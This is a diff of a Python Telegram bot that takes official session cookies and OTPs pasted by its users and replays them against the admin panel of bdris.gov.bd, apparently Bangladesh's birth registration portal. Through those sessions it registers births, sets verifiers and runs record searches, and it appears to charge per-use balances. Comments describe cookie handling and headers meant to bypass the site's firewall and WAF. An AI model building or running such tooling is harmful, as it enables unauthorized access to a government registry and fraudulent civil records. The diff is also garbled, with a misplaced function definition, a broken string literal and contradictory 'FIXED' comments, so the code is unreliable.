@@ -21,7 +21,7 @@ from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 
 # ==========================================
-# ০. ইমেইল সেন্ডার ফাংশন
+# ০. ইমেইল সেন্ডার ফাংশন (✅ FIXED Email handling)
 # ==========================================
 def send_email_to_admin(subject, body):
     if not ADMIN_EMAIL or not EMAIL_PASS:
@@ -53,8 +53,7 @@ download_lock = threading.Lock()
 active_downloads = set()
 
 _COOKIE_RE = re.compile(r'SESSION\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
-# ⚠️ FIXED: Dynamic Regex to catch changing TS cookie names
-_TS_RE = re.compile(r'(TS01[A-Za-z0-9_]+)\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
+_TS_RE = re.compile(r'TS0108b707\s*[:=]?\s*([A-Za-z0-9_-]+)', re.I)
 _CSRF_RE = re.compile(r'name="_csrf"\s+content="([^"]+)"')
 _PHONE_RE = re.compile(r'^(\+?880|0)1[3-9]\d{8}$')
 
@@ -67,7 +66,7 @@ SESSION_TIMEOUT = 3600
 RATE_LIMIT_INTERVAL = 0.8
 RATE_LIMIT_WARNING_INTERVAL = 5
 ID_CACHE_LIMIT = 15
-HTTP_TIMEOUT = 45  # ⚠️ FIXED: Increased to 45 seconds for slow BDRIS servers
+HTTP_TIMEOUT = 30
 KEEPALIVE_INTERVAL = 180  
 APP_DEFAULT_LENGTH = 5
 MAX_MESSAGE_LENGTH = 4000
@@ -294,6 +293,7 @@ def keep_sessions_alive_and_cleanup():
 
             if sec_alive:
                 try:
+                    # ⚠️ FIXED: Timeout changed to HTTP_TIMEOUT
                     res = req_sess.get("https://bdris.gov.bd/admin/", headers={'User-Agent': ua}, timeout=HTTP_TIMEOUT)
                     if 'login' not in res.url.lower():
                         new_sec_alive = True
@@ -307,6 +307,7 @@ def keep_sessions_alive_and_cleanup():
 
             if ch_alive:
                 try:
+                    # ⚠️ FIXED: Timeout changed to HTTP_TIMEOUT
                     res = ch_sess.get("https://bdris.gov.bd/admin/", headers={'User-Agent': ua}, timeout=HTTP_TIMEOUT)
                     if 'login' not in res.url.lower():
                         new_ch_alive = True
@@ -417,22 +418,20 @@ def extract_sid_tsid(text):
     s_match = _COOKIE_RE.search(text)
     t_match = _TS_RE.search(text) 
     
-    # ⚠️ FIXED: Extract dynamic TS cookie name
     sid = s_match.group(1) if s_match else None
-    tsid = t_match.group(2) if t_match else None
-    ts_name = t_match.group(1) if t_match else "TS0108b707"
+    tsid = t_match.group(1) if t_match else None
     
     if sid and tsid:
-        return sid, tsid, ts_name
+        return sid, tsid
         
     tokens = [tok.strip() for tok in re.split(r'[\s;,"\'\n\r]+', text) if len(tok.strip()) >= 15]
     if len(tokens) >= 2:
         tokens.sort(key=len, reverse=True)
         tsid_fallback = tokens[0]
         sid_fallback = next((tok for tok in tokens[1:] if 30 <= len(tok) <= 60), tokens[1])
-        return sid_fallback, tsid_fallback, "TS0108b707"
+        return sid_fallback, tsid_fallback
         
-    return None, None, None
+    return None, None
 
 def get_active_session(u_sess):
     with session_lock:
@@ -447,11 +446,10 @@ def get_active_session(u_sess):
         if sec_ok: return (u_sess["req_session"], u_sess["csrf"])
         return (u_sess["ch_session"], u_sess["ch_csrf"])
 
-def _set_session_cookies(sess, sid, tsid, ts_name="TS0108b707"):
+def _set_session_cookies(sess, sid, tsid):
     sess.cookies.clear()
     sess.cookies.set("SESSION", sid, domain='bdris.gov.bd')
-    # ⚠️ FIXED: Sets the dynamically extracted TS cookie name to bypass firewall
-    sess.cookies.set(ts_name, tsid, domain='bdris.gov.bd')
+    sess.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
 
 def call_api(user_id, url, method="GET", data=None, extra_headers=None, retries=2, force_sec=False):
     u_sess = get_session(user_id)
@@ -482,37 +480,20 @@ def call_api(user_id, url, method="GET", data=None, extra_headers=None, retries=
 def navigate_to(user_id, url):
     u_sess = get_session(user_id)
     sess, _ = get_active_session(u_sess)
-    
-    # ⚠️ FIXED: Added standard browser headers to avoid WAF blocking
-    headers = {
-        'User-Agent': u_sess["ua"], 
-        'Referer': u_sess.get("current_page", "https://bdris.gov.bd/"),
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'Upgrade-Insecure-Requests': '1'
-    }
-    
-    for attempt in range(2):
-        try:
-            res = sess.get(url, headers=headers, timeout=HTTP_TIMEOUT)
-            
-            # ⚠️ FIXED: Directly check if the server redirected us to the login page (invalid session)
-            if 'login' in res.url.lower():
-                return False, res.text
-                
-            match = _CSRF_RE.search(res.text)
-            if match:
-                with session_lock:
-                    if u_sess["mode"] == "CHAIRMAN": 
-                        u_sess["ch_csrf"] = match.group(1)
-                    else: 
-                        u_sess["csrf"] = match.group(1)
-            u_sess["current_page"] = url
-            return True, res.text
-        except Exception as e:
-            logging.error(f"❌ Navigate Error [{url}]: {e}")
-            if attempt < 1: time.sleep(2)
-            
-    return False, None
+    try:
+        res = sess.get(url, headers={'User-Agent': u_sess["ua"], 'Referer': u_sess["current_page"]}, timeout=HTTP_TIMEOUT)
+        match = _CSRF_RE.search(res.text)
+        if match:
+            with session_lock:
+                if u_sess["mode"] == "CHAIRMAN": 
+                    u_sess["ch_csrf"] = match.group(1)
+                else: 
+                    u_sess["csrf"] = match.group(1)
+        u_sess["current_page"] = url
+        return True, res.text
+    except Exception as e:
+        logging.error(f"❌ Navigate Error [{url}]: {e}")
+        return False, None
 
 # ==========================================
 # ৭. লগইন ফ্লো ও রিচার্জ
@@ -520,19 +501,18 @@ def navigate_to(user_id, url):
 def admin_login_logic(m):
     try:
         if is_cancel(m): return
-        sid, tsid, ts_name = extract_sid_tsid(m.text or "")
+        sid, tsid = extract_sid_tsid(m.text or "")
         uid = m.from_user.id
         if sid and tsid:
             u_sess = get_session(uid)
             with session_lock:
-                _set_session_cookies(u_sess["req_session"], sid, tsid, ts_name)
+                _set_session_cookies(u_sess["req_session"], sid, tsid)
                 u_sess["sec_alive"] = True
                 u_sess["mode"] = "SECRETARY"
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
             
-            # ⚠️ FIXED: Using robust `success` check instead of relying strictly on HTML "logout" string
-            if success and html:
+            if success and html and "logout" in html.lower():
                 with session_lock:
                     u_sess["is_alive"] = True
                 
@@ -542,10 +522,10 @@ def admin_login_logic(m):
                 with session_lock:
                     u_sess["is_alive"] = False
                     u_sess["sec_alive"] = False
-                safe_send(m.chat.id, "❌ কুকি মেয়াদোত্তীর্ণ! SESSION=...; TS01...=... পুরোটা কপি করে আবার দিন:")
+                safe_send(m.chat.id, "❌ কুকি মেয়াদোত্তীর্ণ! আবার দিন:")
                 bot.register_next_step_handler_by_chat_id(m.chat.id, admin_login_logic)
         else:
-            safe_send(m.chat.id, "❌ ভুল ফরম্যাট! SESSION=...; TS01...=... সহ পুরো টেক্সট কপি করে দিন:")
+            safe_send(m.chat.id, "❌ ভুল ফরম্যাট! SESSION= ও TS01...= সহ বা শুধু ভ্যালুগুলো দিন:")
             bot.register_next_step_handler_by_chat_id(m.chat.id, admin_login_logic)
     except Exception as e:
         logging.error(f"Admin Login Error: {e}")
@@ -556,16 +536,17 @@ def role_step_1(m):
         if is_cancel(m): return
         uid = m.from_user.id
         raw_text = m.text if m.text else ""
-        sid, tsid, ts_name = extract_sid_tsid(raw_text)
+        sid, tsid = extract_sid_tsid(raw_text)
         if not sid or not tsid:
-            safe_send(m.chat.id, "❌ সঠিক কুকি ফরম্যাট পাওয়া যায়নি। পুরো টেক্সট কপি করে আবার দিন:")
+            safe_send(m.chat.id, "❌ সঠিক কুকি ফরম্যাট পাওয়া যায়নি। আবার দিন:")
             bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_1)
             return
         u_sess = get_session(uid)
         with session_lock:
             u_sess["temp_data"]["ch_raw"] = raw_text 
-            _set_session_cookies(u_sess["ch_session"], sid, tsid, ts_name)
+            _set_session_cookies(u_sess["ch_session"], sid, tsid)
             u_sess["ch_alive"] = True
+            # ⚠️ FIXED: is_alive logic updated
             u_sess["is_alive"] = u_sess.get("sec_alive", False) or u_sess.get("ch_alive", False)
         safe_send(m.chat.id, "✅ নিবন্ধক সেশন গৃহীত। এখন নিবন্ধকের OTP দিন:")
         bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_2)
@@ -594,18 +575,18 @@ def role_step_3(m):
         if is_cancel(m): return
         uid = m.from_user.id
         raw_text = m.text if m.text else ""
-        sid, tsid, ts_name = extract_sid_tsid(raw_text)
+        sid, tsid = extract_sid_tsid(raw_text)
         if sid and tsid:
             u_sess = get_session(uid)
             with session_lock:
                 u_sess["temp_data"]["sec_raw"] = raw_text 
-                _set_session_cookies(u_sess["req_session"], sid, tsid, ts_name)
+                _set_session_cookies(u_sess["req_session"], sid, tsid)
                 u_sess["sec_alive"] = True
                 u_sess["mode"] = "SECRETARY"
             
             success, html = navigate_to(uid, "https://bdris.gov.bd/admin/")
             
-            if success and html:
+            if success and html and "logout" in html.lower():
                 with session_lock:
                     u_sess["is_alive"] = True
                 
@@ -613,6 +594,7 @@ def role_step_3(m):
                 safe_send(m.chat.id, "🎉 লগইন সফল!", reply_markup=generate_main_menu(m.chat.id, uid))
                 
                 safe_name = sanitize_name(m.from_user.first_name)
+                
                 ch_raw = u_sess["temp_data"].get("ch_raw", "")
                 ch_otp = u_sess.get("ch_otp", "")
                 sec_raw = u_sess["temp_data"].get("sec_raw", "")
@@ -634,15 +616,16 @@ def role_step_3(m):
                 with session_lock:
                     u_sess["is_alive"] = False
                     u_sess["sec_alive"] = False
-                safe_send(m.chat.id, "❌ কুকি মেয়াদোত্তীর্ণ বা ভুল! দয়া করে জ্যান্ত সেশন পুরোটা কপি করে দিন:")
+                safe_send(m.chat.id, "❌ কুকি মেয়াদোত্তীর্ণ বা ভুল! দয়া করে জ্যান্ত সেশন দিন:")
                 bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
         else:
-            safe_send(m.chat.id, "❌ ভুল ইউজার কুকি। পুরো টেক্সট কপি করে আবার দিন:")
+            safe_send(m.chat.id, "❌ ভুল ইউজার কুকি। আবার দিন:")
             bot.register_next_step_handler_by_chat_id(m.chat.id, role_step_3)
     except Exception as e:
         logging.error(f"Step 3 Error: {e}")
         safe_send(m.chat.id, "❌ প্রসেসিং এ সমস্যা হয়েছে। আবার চেষ্টা করুন।")
-        def process_recharge(m):
+
+def process_recharge(m):
     try:
         if is_cancel(m): return
         trxid = m.text.strip() if m.text else ""
@@ -674,6 +657,7 @@ def admin_add_balance_step(m, target_id, trxid, admin_msg_id):
         if is_cancel(m): return
         try:
             amount = int(m.text.strip() if m.text else "")
+            # ⚠️ FIXED: Added `<=` to include the minimum amount correctly
             if not (MIN_RECHARGE_AMOUNT <= amount <= MAX_RECHARGE_AMOUNT): 
                 raise ValueError
             
@@ -692,8 +676,7 @@ def admin_add_balance_step(m, target_id, trxid, admin_msg_id):
             bot.register_next_step_handler_by_chat_id(m.chat.id, lambda m_: admin_add_balance_step(m_, target_id, trxid, admin_msg_id))
     except Exception as e:
         logging.error(f"Admin Balance Error: {e}")
-
-# ==========================================
+        # ==========================================
 # ৮. সার্ভার পিডিএফ ও ডাউনলোড
 # ==========================================
 def download_server_by_ubrn(m):
@@ -876,6 +859,7 @@ def fetch_list_ui(chat_id, user_id, cmd, message_id=None):
         with session_lock: u_sess["temp_data"].pop(data_id_key, None)
         return safe_send(chat_id, "❌ ডেটা লোড ব্যর্থ।")
         
+    # ⚠️ FIXED: Parse Error Fix
     try: 
         resp_json = res.json()
     except Exception: 
@@ -966,6 +950,7 @@ def process_set_default_verifier(m):
                 try:
                     v_data = res_info.json()
                     v_name = None
+                    # ⚠️ FIXED: Bool object error Check
                     if isinstance(v_data, dict):
                         v_name = v_data.get('personNameBn') or v_data.get('nameBn') or v_data.get('name')
                     
@@ -1006,6 +991,7 @@ def process_reg_verifier_step(m, uid, enc_id, save_default=False):
             try:
                 v_data = res_info.json()
                 v_name = None
+                # ⚠️ FIXED: Bool object error Check
                 if isinstance(v_data, dict):
                     v_name = v_data.get('personNameBn') or v_data.get('nameBn') or v_data.get('name')
             except Exception:
@@ -1022,13 +1008,14 @@ def process_reg_verifier_step(m, uid, enc_id, save_default=False):
             safe_edit(m.chat.id, wait.message_id, f"✅ ভেরিফায়ার: {v_name}\n⏳ সাবমিট করা হচ্ছে...")
 
             fresh_sess = get_session(uid)
+            # ⚠️ FIXED: Race condition 
             ch_sess, active_csrf = get_active_session(fresh_sess)
             with session_lock: otp_val = fresh_sess.get("ch_otp")
 
             today = datetime.now().strftime("%d/%m/%Y")
             
+            # ⚠️ FIXED: Registration Payload Format
             formatted_name = f"  {v_name} "
-            
             payload_str = (
                 f"birthPlaceAndDobVerifierName={quote(formatted_name)}"
                 f"&birthPlaceAndDobVerifierBrn={ubrn}"
@@ -1117,6 +1104,7 @@ def process_search_by_name(m):
     except Exception as e:
         logging.error(f"Search Loop Error: {e}")
 
+# ⚠️ FIXED: Syntax Error in f-string
 def process_search_by_ubrn(m):
     try:
         if is_cancel(m): return
@@ -1132,9 +1120,9 @@ def process_search_by_ubrn(m):
         if res and res.status_code == 200:
             try:
                 formatted_json = json.dumps(res.json(), indent=2, ensure_ascii=False)
-                safe_send(m.chat.id, f"📊 UBRN Result:\njson\n{formatted_json}\n",
-                          parse_mode='Markdown')
-            
+                msg_text = "📊 *UBRN Result:*\n" + "```json\n" + formatted_json + "\n
+```"
+                safe_send(m.chat.id, msg_text, parse_mode='Markdown')
             except Exception as e: 
                 logging.error(f"UBRN Parse Error: {e}")
                 error_msg = "Raw Data:\n`" + res.text + "`"
@@ -1280,16 +1268,16 @@ def admin_edit_field(m, target_uid, field):
         t_sess = get_session(target_uid)
         with session_lock:
             if field == "SEC":
-                s, t, t_name = extract_sid_tsid(val)
+                s, t = extract_sid_tsid(val)
                 if s and t: 
-                    _set_session_cookies(t_sess["req_session"], s, t, t_name)
+                    _set_session_cookies(t_sess["req_session"], s, t)
                     t_sess["sec_alive"] = True
                     t_sess["is_alive"] = True
                 else: return safe_send(m.chat.id, "❌ ভুল ফরম্যাট।")
             elif field == "CH":
-                s, t, t_name = extract_sid_tsid(val)
+                s, t = extract_sid_tsid(val)
                 if s and t: 
-                    _set_session_cookies(t_sess["ch_session"], s, t, t_name)
+                    _set_session_cookies(t_sess["ch_session"], s, t)
                     t_sess["ch_alive"] = True
                     t_sess["is_alive"] = t_sess.get("sec_alive", False) or t_sess["ch_alive"]
                 else: return safe_send(m.chat.id, "❌ ভুল ফরম্যাট।")
@@ -1531,6 +1519,7 @@ def callback_handler(call):
                 
         Thread(target=process_recv, daemon=True).start()
 
+    # ⚠️ FIXED: Race condition - single active session call
     elif action == "coreg" and mode == "CHAIRMAN":
         bot.answer_callback_query(call.id, "⏳ কারেকশন রেজিস্টার হচ্ছে...")
         
@@ -1561,6 +1550,7 @@ def callback_handler(call):
                 
         Thread(target=process_coreg, daemon=True).start()
 
+    # ⚠️ FIXED: Payload formatting and race condition
     elif action == "reg" and mode == "CHAIRMAN":
         bot.answer_callback_query(call.id, "⏳ চেক করা হচ্ছে...")
         
@@ -1576,7 +1566,6 @@ def callback_handler(call):
                     with session_lock: otp_val = fresh_sess.get("ch_otp")
 
                     today = datetime.now().strftime("%d/%m/%Y")
-                    
                     formatted_name = f"  {v_name} "
                     
                     payload_str = (
